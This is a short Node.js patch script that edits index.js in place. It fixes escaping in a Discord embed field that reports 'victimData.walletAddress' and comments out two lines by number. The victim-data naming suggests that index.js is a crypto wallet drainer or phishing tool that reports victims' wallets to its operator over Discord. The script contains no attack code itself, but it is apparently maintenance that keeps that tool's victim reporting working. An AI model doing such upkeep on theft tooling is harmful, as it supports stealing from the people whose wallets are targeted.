import fs from 'fs';

let content = fs.readFileSync('index.js', 'utf8');

// Fix Discord embed line 126
content = content.replace(
  '{ name: "👤 Wallet", value: ``${victimData.walletAddress}``, inline: false },',
  '{ name: "👤 Wallet", value: `\\`${victimData.walletAddress}\\``, inline: false },'
);

// Fix template literal escaping
content = content.replace(/\\\\\$/g, '\\$');
content = content.replace(/\\\${/g, '${');

// Comment out the 2 problematic uncommented lines
const lines = content.split('\n');
if (lines[1321] && !lines[1321].trim().startsWith('//')) {
  lines[1321] = '// ' + lines[1321];
}
if (lines[1322] && !lines[1322].trim().startsWith('//')) {
  lines[1322] = '// ' + lines[1322];
}

fs.writeFileSync('index.js', lines.join('\n'));
console.log('✅ Fixed syntax errors while preserving HTML');
